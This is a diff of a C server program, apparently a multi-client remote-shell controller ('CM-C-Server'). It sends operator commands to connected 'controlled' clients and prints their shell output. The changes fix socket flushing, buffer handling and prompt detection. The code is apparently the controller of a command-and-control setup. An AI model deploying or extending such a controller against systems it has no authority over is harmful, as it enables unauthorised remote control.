@@ -83,7 +83,7 @@ int wait_for_fd_readable(int fd, int timeout_ms) {
     return select(fd + 1, &rset, NULL, NULL, &tv);
 }
 
-// 获取当前日期 ISO 格式 2025-01-01
+// 获取当前日期 ISO 格式
 const char* date_iso() {
     static char buf[32];
     time_t now = time(NULL);
@@ -94,25 +94,18 @@ const char* date_iso() {
 
 // 彩色Logo和当前程序信息和当前程序文件名
 int show_logo_info(const char *prog_name) {
-
 #define RED     "\033[31m"
 #define GREEN   "\033[32m"
 #define YELLOW  "\033[33m"
 #define BLUE    "\033[34m"
 #define CYAN    "\033[36m"
-
-
-#define OVERLINE "\033[53m" // 上划线
-#define STRIKETHROUGH "\033[9m" // 删除线
-#define UNDERLINE "\033[4m" // 下划线
-#define BOLD    "\033[1m" // 粗体
-
+#define UNDERLINE "\033[4m" 
+#define BOLD    "\033[1m" 
 #define RESET   "\033[0m"
 
-    char logo_buf[1024];  // logo 足够大的缓冲区
-    char info_buf[512];  // info 足够大的缓冲区
+    char logo_buf[1024];  
+    char info_buf[512];  
     
-    // 拼接彩色Logo字符串
     sprintf(logo_buf,
         "%s   _____    __  __               %s_____  %s\r\n"
         "%s  / ____|  |  \\/  |             %s/ ____| %s\r\n"
@@ -129,17 +122,11 @@ int show_logo_info(const char *prog_name) {
         BLUE, RED, RESET
     );
 
-    // 当前程序的版本号和构建日期和构建时间和项目URL和Issue URL
-        sprintf(info_buf,
-            "%sVersion: %s%s%s%s, %sBuild: %s%s%s %s%s\r\n",
-            // "%sProjectURL: %s%s%s\r\n"
-	        // "%sIssueURL: %s%s%s\r\n",
-
-        RED, BOLD, UNDERLINE, VERSION_STR, RESET, BLUE, BOLD, UNDERLINE, /*BUILD_DATE*/date_iso(), BUILD_TIME, RESET//,
-        // GREEN, BOLD, PROJECT_URL, RESET, YELLOW, BOLD, ISSUE_URL, RESET, RESET,
+    sprintf(info_buf,
+        "%sVersion: %s%s%s%s, %sBuild: %s%s%s %s%s\r\n",
+        RED, BOLD, UNDERLINE, VERSION_STR, RESET, BLUE, BOLD, UNDERLINE, date_iso(), BUILD_TIME, RESET
     );
 
-    // 显示完整Logo和当前程序信息和当前程序文件名
     printf("%s", logo_buf);
     printf("\tCM-C-Server:%s\r\n", prog_name);
     printf("%s", info_buf);
@@ -147,15 +134,34 @@ int show_logo_info(const char *prog_name) {
     return 0;
 }
 
-// 精准处理单个客户端的数据接收，直到读齐它的结果和提示符
+// ✨ 精准处理单个客户端的数据接收（已深度修复时序错位与脏数据留存）
 void handle_single_client_sync(int idx, const char *msg) {
+    // 1. 发送新命令前，利用非阻塞模式彻底“洗胃”，清空上一次交互由于强行断开导致的管道残留脏数据
+#ifdef _WIN32
+    unsigned long l = 1;
+    ioctlsocket(clients[idx].fd, FIONBIO, &l);
+    char flush_buf[1024];
+    while (recv(clients[idx].fd, flush_buf, sizeof(flush_buf), 0) > 0);
+    l = 0;
+    ioctlsocket(clients[idx].fd, FIONBIO, &l);
+#else
+    int flags = fcntl(clients[idx].fd, F_GETFL, 0);
+    fcntl(clients[idx].fd, F_SETFL, flags | O_NONBLOCK);
+    char flush_buf[1024];
+    while (recv(clients[idx].fd, flush_buf, sizeof(flush_buf), 0) > 0);
+    fcntl(clients[idx].fd, F_SETFL, flags);
+#endif
+
+    // 2. 发送新命令
     send(clients[idx].fd, msg, (int)strlen(msg), 0);
     
     printf("[%d]:\n", clients[idx].id);
     fflush(stdout);
     
     char recv_accum[BUF_SIZE * 2] = {0};
+    size_t total_len = 0;
     
+    // 3. 严格同步对齐接收
     while (1) {
         int ret = wait_for_fd_readable(clients[idx].fd, 1500);
         if (ret <= 0) break; 
@@ -169,17 +175,21 @@ void handle_single_client_sync(int idx, const char *msg) {
         }
         
         chunk[len] = '\0';
-        if (strlen(recv_accum) + len < sizeof(recv_accum) - 1) {
-            strcat(recv_accum, chunk);
+        if (total_len + len < sizeof(recv_accum) - 1) {
+            memcpy(recv_accum + total_len, chunk, len);
+            total_len += len;
+            recv_accum[total_len] = '\0';
         } else {
             break;
         }
         
-        if (strstr(recv_accum, "->") != NULL || strstr(recv_accum, "-{20") != NULL) {
+        // 🌟 核心对齐逻辑：必须在缓冲区最末尾检测到完整合规的提示符结尾“-> ”才允许收工
+        if (total_len >= 3 && strcmp(recv_accum + total_len - 3, "-> ") == 0) {
             break;
         }
     }
     
+    // 4. 清理、格式化并输出回显
     char *clean_p = recv_accum;
     while (*clean_p == '\n' || *clean_p == '\r' || *clean_p == ' ') clean_p++;
     
@@ -195,13 +205,13 @@ void handle_single_client_sync(int idx, const char *msg) {
             if (prompt_ptr > clean_p) {
                 char save = *prompt_ptr;
                 *prompt_ptr = '\0';
-                printf("%s\n", clean_p);
+                printf("%s\n", clean_p); // 打印真正的执行结果
                 *prompt_ptr = save;
             }
             
             char *p = prompt_ptr;
             while (*p == '\n' || *p == '\r') p++;
-            printf("%s\n\n", p);
+            printf("%s\n\n", p); // 打印回传的最新 Shell 状态提示符
         } else {
             printf("%s\n\n", clean_p);
         }
@@ -267,7 +277,6 @@ int main(int argc, char *argv[]) {
     bind(server_fd, (struct sockaddr*)&addr, sizeof(addr));
     listen(server_fd, 10);
     
-    // 首次运行贴心地打印一次菜单引导
     print_menu(prog_name, server_ip, port);
 
     while (1) {
@@ -325,15 +334,12 @@ int main(int argc, char *argv[]) {
                 
                 if (strlen(buf) == 0) continue;
 
-                // 退出命令
                 if (strcmp(buf, "exit") == 0 || strcmp(buf, "quit") == 0) break;
                 
-                // 帮助命令
                 if (strcmp(buf, "help") == 0) {
                     print_menu(prog_name, server_ip, port);
                     continue;
                 }
-                // 在线受控端命令
                 if (strcmp(buf, "list") == 0) {
                     for (int i = 0; i < client_count; i++) printf("[%d]\n", clients[i].id);
                     fflush(stdout);
@@ -366,7 +372,7 @@ int main(int argc, char *argv[]) {
             }
         }
         
-        // 挂机清理
+        // 挂机心跳与死线清理
         for (int i = 0; i < client_count; i++) {
             if (wait_for_fd_readable(clients[i].fd, 1) > 0) {
                 char check_buf[1] = {0};
